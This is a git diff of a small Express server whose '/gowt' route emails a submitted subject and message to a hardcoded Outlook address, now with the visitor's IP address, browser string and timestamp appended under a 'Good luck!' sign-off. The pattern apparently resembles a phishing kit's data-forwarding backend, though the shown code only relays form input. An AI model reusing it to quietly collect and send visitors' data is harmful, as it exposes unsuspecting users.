@@ -126,7 +126,7 @@ app.post("/go", (req, res) => {
   });
 });
 
-// New route: Sends email without Telegram integration
+// New route: Sends email without Telegram integration but includes all additional info
 app.post("/gowt", (req, res) => {
   const { subject, message } = req.body;
 
@@ -157,12 +157,20 @@ app.post("/gowt", (req, res) => {
       },
     });
 
+    // Collect additional information (IP address, browser, timestamp)
+    const ipAddress = req.ip; // IP address of the user
+    const userAgent = req.headers["user-agent"]; // Browser info
+    const timestamp = new Date().toISOString(); // Current timestamp in ISO format
+
+    // Prepare the full email body
+    const fullMessage = `*Message* \n${message}\n\n=======================\n*Additional Information*\n=======================\n\n*IP Address* \n${ipAddress}\n\n*Browser* \n${userAgent}\n\n*Timestamp* \n${timestamp}\n\n_Good luck!_`;
+
     // Prepare email options
     const mailOptions = {
       from: user, // Sender email
       to: "hey.heatherw@outlook.com", // Recipient email
       subject: subject, // Email subject
-      text: message, // Email body
+      text: fullMessage, // Email body
     };
 
     // Send email
